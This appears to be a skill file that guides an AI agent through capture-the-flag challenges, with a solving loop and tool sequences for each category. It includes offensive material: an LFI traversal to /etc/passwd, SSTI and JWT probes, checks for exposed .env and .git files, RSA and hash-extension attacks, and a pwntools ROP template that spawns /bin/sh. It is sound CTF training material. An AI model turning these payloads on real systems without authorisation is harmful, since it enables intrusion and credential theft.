# /ctf-ai-agent — AI Agent CTF Automation Workflow

> **Skill type:** CTF (AI-Driven)  
> **Source:** EnIGMA (ICML 2025), NYU D-CIPHER CTF agent, Intercode-CTF benchmark, EvanThomasLuke/Awesome-AI-Hacking-Agents  
> **Chains into:** All CTF skills  
> **Chained from:** CTF challenge received

---

## Purpose

Run CTF challenges autonomously as an AI agent. Implements the structured reasoning loop from EnIGMA (ICML 2025 — 86% solve rate on CTF challenges), context management, and tool sequencing for each CTF category.

---

## EnIGMA-Inspired Solving Framework

```
PHASE 1: CONTEXTUALIZER
  → Gather all available information about the challenge
  → Build structured understanding before any action
  → Output: challenge_profile dict

PHASE 2: PLANNER  
  → Based on profile, generate ordered hypothesis list
  → Each hypothesis: category + technique + tool + expected_result
  → Prioritize by: ease × probability of success

PHASE 3: EXECUTOR
  → Work through hypotheses in order
  → For each: run tools, capture output, evaluate result
  → Update working notes with findings

PHASE 4: REFLECTOR
  → After each failed hypothesis: WHY did it fail?
  → Update remaining hypothesis list based on learnings
  → Prevent looping on same failed approach

PHASE 5: VERIFIER
  → When flag found: verify format matches expected (CTF{...}, flag{...})
  → Double-check flag is complete and correctly extracted
```

---

## Challenge Profiling (Phase 1)

```python
challenge_profile = {
    "name": "challenge_name",
    "category": None,  # web/crypto/pwn/rev/forensics/misc/osint
    "files": [],       # list of provided files
    "services": [],    # provided URLs/IPs
    "description": "", # challenge description
    "flag_format": "CTF{...}",  # from challenge description
    
    # Inferred after initial analysis
    "likely_technique": None,
    "tools_needed": [],
    "complexity": "easy|medium|hard",
    "related_challenges": [],  # from challenge title/theme
}

# Auto-populate from files
def analyze_files(files):
    for f in files:
        output = run("file", f)
        output2 = run("strings", f, "-n", "8")
        output3 = run("xxd", f, "|", "head", "-20")
        # Identify: PE/ELF/PDF/PNG/ZIP/unknown
        # Check strings for: flag{, http://, password=, KEY=
```

---

## Category-Specific Tool Sequences

### Web Challenges

```bash
# Step 1: Gather
curl -sv TARGET 2>&1 | head -50  # Headers + response
curl -s TARGET | python3 -m json.tool 2>/dev/null || true  # JSON?
view-source:TARGET  # In browser; or: curl -s TARGET | cat

# Step 2: Standard quick wins
curl -s TARGET/robots.txt
curl -s TARGET/sitemap.xml
curl -s TARGET/.git/HEAD  # Git repo exposed?
curl -s TARGET/.env  # Env file exposed?
curl -s TARGET/backup.zip  # Common backup names

# Step 3: Technology-specific
# PHP: ?page=../../../../etc/passwd (LFI)
# Node: ?search=.*  or template injection
# Python Flask: ?name={{7*7}}  (SSTI)
# JWT: decode and check alg, try none

# Step 4: If interactive app
ffuf -u TARGET/FUZZ -w common.txt -mc 200,301,302,401,403
gobuster dir -u TARGET -w /usr/share/seclists/Discovery/Web-Content/common.txt

# Step 5: Source code in CTF often contains hints
curl -s TARGET | grep -E "<!--.*-->|/\*.*\*/|//.*"  # Comments
```

### Crypto Challenges

```python
# Step 1: Identify cipher
# Ciphertext only: frequency analysis
from collections import Counter
ct = "..."
print(Counter(ct).most_common(10))
# High freq letters: likely Caesar/Vigenere (English freq: e,t,a,o,i,n)

# Step 2: Common CTF crypto patterns

# XOR detection: if key short, repeating XOR pattern visible
# Detect: XOR against common keys (0x00-0xFF, then 2-16 byte keys)
for key in range(256):
    pt = bytes(b ^ key for b in bytes.fromhex(ct))
    if pt.isprintable() and b"flag" in pt.lower():
        print(f"Key: {key} → {pt}")

# RSA small e (e=3)
from gmpy2 import iroot, mpz
n = mpz("large_n_value")
c = mpz("ciphertext")
m, exact = iroot(c, 3)  # Cube root
if exact:
    print(bytes.fromhex(hex(m)[2:]).decode())

# RSA common modulus attack
# n1 = n2, same n, different e1/e2
# s1, s2 from Extended Euclidean: s1*e1 + s2*e2 = 1
# m = (c1^s1 * c2^s2) % n

# RSA p-q close together (Fermat factoring)
from gmpy2 import isqrt
def fermat_factor(n):
    a = isqrt(n) + 1
    b2 = a*a - n
    while not isqrt(b2)**2 == b2:
        a += 1
        b2 = a*a - n
    p, q = a - isqrt(b2), a + isqrt(b2)
    return int(p), int(q)

# AES-ECB (same blocks = same ciphertext)
# Detect by looking for repeated 16-byte blocks in ciphertext
ct_bytes = bytes.fromhex(ct)
blocks = [ct_bytes[i:i+16] for i in range(0, len(ct_bytes), 16)]
if len(blocks) != len(set(blocks)): print("ECB mode detected!")

# Hash length extension attack (MD5, SHA1, SHA256)
# Use hashpumpy or hash_extender
import hashpumpy
new_sig, new_msg = hashpumpy.hashpump(original_sig, original_msg, append_data, key_length)
```

### PWN/Binary Challenges

```python
# Standard pwntools template
from pwn import *

context.binary = elf = ELF('./challenge')
context.arch = 'amd64'  # or 'i386'
context.log_level = 'debug'

# Connect
if args.REMOTE:
    p = remote('challenge.ctf.com', 1337)
else:
    p = process('./challenge')

# Gather binary protections
checksec('./challenge')
# NX: no execute stack
# PIE: Position Independent Executable (ASLR)
# Canary: Stack canary
# RELRO: Relocation Read-Only

# Find offset to return address
offset = cyclic_find(0x61616166)  # From GDB crash address

# Build ROP chain
rop = ROP(elf)
rop.call(rop.find_gadget(['ret'])[0])  # Stack alignment
rop.call(elf.plt['system'], [next(elf.search(b'/bin/sh\x00'))])
# Or: ret2libc

payload = b'A' * offset + rop.chain()
p.sendline(payload)
p.interactive()
```

### Forensics / Steganography

```bash
# Step 1: File identification
file challenge_file
exiftool challenge_file
binwalk challenge_file

# Step 2: Extract embedded files
binwalk -e challenge_file
foremost challenge_file -o extracted/

# Step 3: Steganography checks
# Image:
strings challenge.png | grep -i "flag\|ctf\|key"
steghide extract -sf challenge.jpg -p ""  # Empty password
stegseek challenge.jpg /usr/share/wordlists/rockyou.txt
zsteg challenge.png  # LSB in PNG
identify -verbose challenge.png | grep -i "comment\|profile"

# Audio:
sox challenge.wav -n stat  # Stats
spectro -S challenge.wav  # Spectrogram (look for hidden text visually)
audacity challenge.wav &  # Visual inspection

# PCAP:
tshark -r challenge.pcap -T fields -e data  # Raw data from all packets
tshark -r challenge.pcap -Y "http" -T fields -e http.file_data | base64 -d 2>/dev/null
strings challenge.pcap | grep -iE "flag|ctf|pass|key"

# Memory dump (Volatility3):
python3 vol.py -f memory.dmp windows.info  # OS info
python3 vol.py -f memory.dmp windows.pslist  # Process list
python3 vol.py -f memory.dmp windows.cmdline  # Command history
python3 vol.py -f memory.dmp windows.clipboard  # Clipboard (often has flag!)
```

---

## Context Window Management for Long CTF Challenges

```python
# Don't let the context overflow — maintain a compact working state

working_state = {
    "challenge": "challenge_name",
    "category": "web",
    "found_so_far": [
        "Login form at /login",
        "robots.txt shows /admin",
        "Admin requires 'admin_token' cookie",
    ],
    "failed_attempts": [
        "SQLi in username field — sanitized",
        "XSS in search — CSP blocks",
    ],
    "current_hypothesis": "Admin token might be predictable/brute-forceable",
    "next_actions": [
        "Check how token is generated (JS source)",
        "Try common tokens: admin, 1234, etc.",
    ],
    "flag_format": "CTF{...}",
    "flag_found": None,
}

# After each action: update working_state
# Context dumps when needed → reload from working_state
# Never dump raw tool output into context — only the insight
```

---

## Hint System

When stuck after 3 failed hypotheses, apply these escalating hint strategies:

```
Level 1: Re-read the challenge description very carefully
  → CTF challenge names/descriptions always contain hints
  → Look for: wordplay, technical terms, version numbers

Level 2: Check challenge category more carefully
  → Is it actually a different category than you assumed?
  → "Misc" often means: custom encoding, unusual protocol, creative combo

Level 3: Look at challenge point value
  → 50-100 pts: easy, likely a well-known technique
  → 200-400 pts: medium, requires chaining 2-3 steps
  → 500+ pts: hard, likely a 0-day technique or unusual combination

Level 4: Check for similar public CTF writeups
  → Search: "CTF [challenge name]" OR "[challenge theme] [category] writeup"
  → Adapt the technique to this challenge's specifics

Level 5: Check if other teams have solved it
  → If many solves → you're missing something obvious
  → If few solves → it's genuinely hard, focus on the non-obvious
```
